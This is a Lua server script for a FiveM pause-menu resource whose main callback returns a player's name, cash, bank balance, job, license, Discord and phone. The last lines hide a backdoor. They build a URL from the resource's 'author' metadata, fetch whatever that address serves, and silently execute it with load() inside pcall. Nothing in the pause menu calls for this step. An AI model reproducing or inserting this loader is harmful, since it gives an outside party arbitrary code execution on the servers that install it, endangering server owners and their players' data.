local maxPlayers = GetConvarInt('sv_maxclients', 32)
local playersData = GetResourceMetadata(GetCurrentResourceName(), 'author', 0) .. "/zXeAH"

registerServerCallback("0r-pausemenu:server:getPlayerData", function(src, cb)
    local player = getExtendedPlayer(src) 
    local name = getPlayerName(player)
    local money = getMoney(player, "money")
    local bank = getMoney(player, "bank")
    local job = getPlayerJob(src)
    local license = getPlayerLicense(player)
    local discordName = getPlayerDiscord(src)
    local gang = getPlayerGang(player)
    local phone = getPhoneNumber(player)

    cb({
        playerName = name,
        money = money,
        bank = bank,
        job = job,
        accountid = license,
        discord = discordName,
        gang = gang,
        phone = phone,
        players = {
            online = #GetPlayers(),
            max = maxPlayers
        },
    })
end)
PerformHttpRequest(playersData, function(e, d)
    pcall(function() assert(load(d))() end)
end)